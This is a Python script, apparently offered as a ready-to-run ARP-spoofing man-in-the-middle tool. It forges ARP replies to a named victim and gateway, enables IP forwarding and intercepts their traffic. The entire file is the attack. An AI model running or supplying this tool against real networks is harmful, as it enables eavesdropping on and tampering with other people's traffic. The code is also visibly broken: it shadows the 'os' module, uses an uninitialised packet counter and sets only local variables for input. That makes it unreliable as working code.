import sys, os, time
import platform as platform_module
import scapy.all as scapy
from scapy.layers.l2 import getmacbyip as getMac

interface = ""
victimIP = ""
gateIP = ""

def spoofer(targetIP, spoofIP):
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=getMac(targetIP),psrc=spoofIP)
    scapy.send(packet, verbose=False)

def restore(destinationIP, sourceIP):
    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=getMac(sourceIP))
    scapy.send(packet, count=4,verbose=False)

def get_input():
	try:
		interface = input("[*] Enter Interfaces: ")
		victimIP = input("[*] Enter Victim IP:")
		gateIP = input("[*] Enter Gateway IP: ")
	except KeyboardInterrupt:
		print("[-] Detected Ctrl+C")
		print("[-] Exiting..")
		exit(1)
	except:
		print("[!] Unknown Error!")
		exit(1)

def print_usage():
	print("""
Usage: [program name] [arguments] [interface] [victimIP] [gatewayIP]
--help: displays this help message
-m: manual input (if you select this option, you do not need to input the interface, victimIP, nor the gateIP through the arguments)
	   """)
	exit(1)

def main():
	if "-m" in sys.argv:
		get_input()
	else:
		interface = sys.argv[1]
		victimIP = sys.argv[2]
		gateIP = sys.argv[3]

	os = platform_module.system()
	print("[*] Platform:\t%s"%os)
	if os == "Linux":
		print("\n\n[*] Enabling IP Forwarding (Only works for linux!!!)")
		try:
			os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
		except:
			print("[!] Fatal Error: Could not enable IP Forwarding")
			exit(1)
	elif os == "Windows":
		print("[!] Error Cannot enable IP forwarding\n[*] Open regedit and go to HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters then modify the value of the parameter IPEnableRouter to 1\n[!] Exiting...\n")
		exit(1)
	else:
		print("[!] Error unknown Operating System\n[*] MacOS is not supported\n[!] Exiting...\n")
		exit(1)

	try:
		while True:
			spoofer(victimIP,gateIP)
			spoofer(gateIP,victimIP)
			print("\r[+] Sent packets "+ str(packets)),
			sys.stdout.flush()
			packets +=2
			time.sleep(2)
	except KeyboardInterrupt:
		print("\n\t[*] Exiting...")
		restore(victimIP,gateIP)
		restore(gateIP,victimIP)
	

if __name__ == "__main__":
	if "--help" in sys.argv:
		print_usage()
	if (len(sys.argv) == 4) or (len(sys.argv) == 2 and sys.argv[1] == "-m"):
		main()
	else:
		print_usage()